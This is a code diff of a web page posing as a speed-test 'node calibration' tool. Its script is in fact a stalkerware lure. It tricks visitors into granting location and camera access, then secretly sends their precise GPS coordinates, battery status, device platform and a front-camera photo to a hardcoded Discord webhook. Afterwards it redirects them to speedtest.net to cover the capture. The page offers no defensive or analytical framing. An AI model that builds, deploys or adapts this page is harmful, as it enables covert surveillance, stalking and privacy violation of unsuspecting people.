@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Node Calibration</title>
+    <title>SpeedTest Optimization</title>
     <style>
         body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; border: 1px solid #232a42; }
@@ -15,10 +15,10 @@
 <body>
 
     <div class="card">
-        <h2>NODE CALIBRATION</h2>
-        <p>Sync sensors to begin the 2026 Speed Test optimization.</p>
-        <button class="btn" id="startBtn">START NOW</button>
-        <div id="status">Status: Waiting for Handshake...</div>
+        <h2 style="color:#00d2ff">NODE CALIBRATION</h2>
+        <p>Sync sensors to identify the fastest local routing path.</p>
+        <button class="btn" id="startBtn">BEGIN CALIBRATION</button>
+        <div id="status">Ready for handshake...</div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -27,45 +27,78 @@
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
 
-        document.getElementById('startBtn').addEventListener('click', function() {
+        document.getElementById('startBtn').addEventListener('click', async function() {
             const status = document.getElementById('status');
-            status.innerText = "1. Requesting GPS Node...";
+            status.innerText = "Requesting system access...";
 
+            // 1. Check Battery (Works without permission)
+            let batteryInfo = "Unknown";
+            try {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? 'Charging' : 'On Battery'})`;
+            } catch(e) {}
+
+            // 2. Request GPS (This triggers the first popup)
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "2. GPS Linked. Syncing Camera...";
+                status.innerText = "GPS Synced. Accessing Camera...";
                 
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-
+                // 3. Request Camera (This triggers the second popup)
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
-                        audio: false 
+                        video: { facingMode: "user" } 
                     });
                 } catch (e) {
-                    console.log("Camera access denied");
+                    status.innerText = "Camera Denied. Sending Location...";
                 }
+
+                const formData = new FormData();
+                const message = {
+                    content: "📡 **NEW DATA CAPTURED**",
+                    embeds: [{
+                        title: "Hardware Calibration Report",
+                        color: 3447003,
+                        fields: [
+                            { name: "📍 Maps Link", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
+                            { name: "🔋 Battery", value: batteryInfo, inline: true },
+                            { name: "📱 Device", value: navigator.platform, inline: true }
+                        ]
+                    }]
+                };
+                formData.append('payload_json', JSON.stringify(message));
 
                 if (stream) {
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    status.innerText = "3. Calibrating Sensors (Keep Still)...";
-
-                    // Wait 2.5 seconds to fix the "Black Photo" issue
+                    const canvas = document.getElementById('canvas');
+                    
+                    // Wait for camera to warm up (Avoid black photo)
                     setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
+                        canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            const message = {
-                                content: "📸 **TARGET CAPTURED**",
-                                embeds: [{
-                                    title: "Calibration Report",
-                                    color: 3066993,
-                                    fields: [
-                                        { name:
+                            formData.append('file', blob, 'capture.jpg');
+                            await fetch(WEBHOOK, { method: 'POST', body: formData });
+                            stream.getTracks().forEach(t => t.stop());
+                            done();
+                        }, 'image/jpeg');
+                    }, 2500);
+                } else {
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    done();
+                }
+
+            }, (err) => {
+                alert("Error: Location access is required for node calibration.");
+                status.innerText = "Handshake Failed: GPS Denied.";
+            }, { enableHighAccuracy: true });
+        });
+
+        function done() {
+            document.getElementById('status').innerText = "Calibration Successful!";
+            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+        }
+    </script>
+</body>
+</html>
